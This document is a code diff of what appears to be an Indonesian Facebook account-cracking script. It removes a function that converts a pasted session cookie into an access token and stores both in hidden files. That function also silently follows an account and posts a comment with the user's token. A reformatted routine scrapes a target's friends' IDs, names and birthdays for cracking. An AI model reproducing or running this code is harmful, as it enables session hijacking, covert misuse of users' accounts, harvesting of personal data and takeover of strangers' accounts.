@@ -448,30 +448,6 @@ def login():
             exit()
     except IOError:
         login123()
-
-def GenerateToken():
-	cookie = Console().input(f" {H2}• {P2}cookie : ")
-	try:
-		app='1348564698517390|007c0a9101b9e1c8ffab727666805038'
-		r    = requests.Session()
-		req1 = r.get('https://graph.facebook.com/v16.0/device/login?method=POST&access_token={}'.format(app)).json()
-		req2 = r.get('https://mbasic.facebook.com/device', cookies={'cookie':cookie}).text.replace('\\','')
-		dat1 = {'fb_dtsg':re.search(r'name="fb_dtsg" value="(.*?)"',str(req2)).group(1), 'jazoest':re.search(r'name="jazoest" value="(.*?)"',str(req2)).group(1), 'qr':re.search(r'name="qr" value="(.*?)"',str(req2)).group(1), 'user_code':req1.get('user_code')}
-		pos1 = r.post('https://mobile.facebook.com{}'.format(re.search(r'form method="post" action="(.*?)"',str(req2)).group(1)), data=dat1, cookies={'cookie':cookie}).text.replace('\\','')
-		dat2 = {'fb_dtsg':re.search(r'name="fb_dtsg" value="(.*?)"',str(pos1)).group(1), 'jazoest':re.search(r'name="jazoest" value="(.*?)"',str(pos1)).group(1), 'scope':re.search(r'name="scope" value="(.*?)"',str(pos1)).group(1), 'display':re.search(r'name="display" value="(.*?)"',str(pos1)).group(1), 'sdk':'', 'sdk_version':'', 'domain':'', 'sso_device':'', 'state':'', 'user_code':re.search(r'name="user_code" value="(.*?)"',str(pos1)).group(1), 'logger_id':re.search(r'name="logger_id" value="(.*?)"',str(pos1)).group(1), 'auth_type':re.search(r'name="auth_type" value="(.*?)"',str(pos1)).group(1), 'auth_nonce':'', 'code_challenge"':'', 'code_challenge_method':'', 'encrypted_post_body':re.search(r'name="encrypted_post_body" value="(.*?)"',str(pos1)).group(1), 'return_format[]':re.search(r'name="return_format\[\]" value="(.*?)"',str(pos1)).group(1)}
-		pos2 = r.post('https://mobile.facebook.com{}'.format(re.search(r'form method="post" action="(.*?)"',str(pos1)).group(1)), data=dat2, cookies={'cookie':cookie}).text.replace('\\','')
-		tok  = r.get('https://graph.facebook.com/v16.0/device/login_status?method=post&code={}&access_token={}'.format(req1.get('code'), app), cookies={'cookie':cookie}).json().get('access_token')
-		open(".vipercok.txt", "w").write(cookie)
-		open(".vipertok.txt", "w").write(tok)
-		viperfollow(cookie)
-		requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={tok}",headers={"cookie": cookie})
-		Console().print(Panel(f"""{P2}{tok}""",width=60,style=f"{color_panel}",title="[bold green]TOKEN"))
-		Console().print(f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script")
-	except Exception as e:
-		if "group" in str(e):
-			Console().print(f" {H2}• {P2}[bold red]Ganti Cookie Kamu yang lain")
-			exit()
-			print("\n")
 			
 			
 def logincoki():
@@ -751,49 +727,38 @@ def crack_post():
 
 
 def dump_publik():
-    with requests.Session() as ses:
-        token = open(".vipertok.txt", "r").read()
-        cok = open(".vipercok.txt", "r").read()
-	cookie={"cookie": cok}
-	fields = "name,friends.fields(id,name,birthday)"
-        prints(
-            Panel(
-                f"""{P2}masukan id target, pastikan id target bersifat publik""",
-                width=60,
-                style=f"{color_panel}",
-            )
-        )
-        idf = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
-            try:
-                headers = {
-                    "connection": "keep-alive",
-                    "accept": "*/*",
-                    "sec-fetch-dest": "empty",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-site": "same-origin",
-                    "sec-fetch-user": "?1",
-                    "sec-ch-ua-mobile": "?1",
-                    "upgrade-insecure-requests": "1",
-                    "user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
-                    "accept-encoding": "gzip, deflate",
-                    "accept-language": "id-ID,id;q=0.9",
-                }
-                if len(id) == 0:
-                    params = {"access_token": token,"fields": fields}
-                else:
-                    params = {"access_token": token, "fields": f"{fields}.after({fields})"}
-                url = ses.get(
-                    f"https://graph.facebook.com/{idf}",
-                    params=params,
-                    headers=headers,
-                    cookies=cookie,
-                ).json()
-                for i in url["friends"]["data"]:
-                    id.append(i["id"] + "|" + i["name"])
-                dump(idf, url["friends"]["paging"]["cursors"]["after"], cookie, token)
-		setting()
-	    except Exception as e:
-                print(f"Error : {e}")
+	with requests.Session() as ses:
+		token = open(".vipertok.txt", "r").read()
+		cok = open(".vipercok.txt", "r").read()
+		cookie={"cookie": cok}
+		fields = "name,friends.fields(id,name,birthday)"
+		prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik""",width=60,style=f"{color_panel}"))
+		idf = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
+		try:
+			headers = {
+				"connection": "keep-alive",
+				"accept": "*/*",
+				"sec-fetch-dest": "empty",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-user": "?1",
+				"sec-ch-ua-mobile": "?1",
+				"upgrade-insecure-requests": "1",
+				"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9",
+			}
+			if len(id) == 0:
+				params = {"access_token": token,"fields": fields}
+			else:
+				params = {"access_token": token, "fields": f"{fields}.after({fields})"}
+			url = ses.get(f"https://graph.facebook.com/{idf}",params=params,headers=headers,cookies=cookie).json()
+			for i in url["friends"]["data"]:
+				id.append(i["id"] + "|" + i["name"])
+			dump(idf, url["friends"]["paging"]["cursors"]["after"], cookie, token)
+			setting()
+		except Exception as e:
+			print(f"Error : {e}")
 
 
 
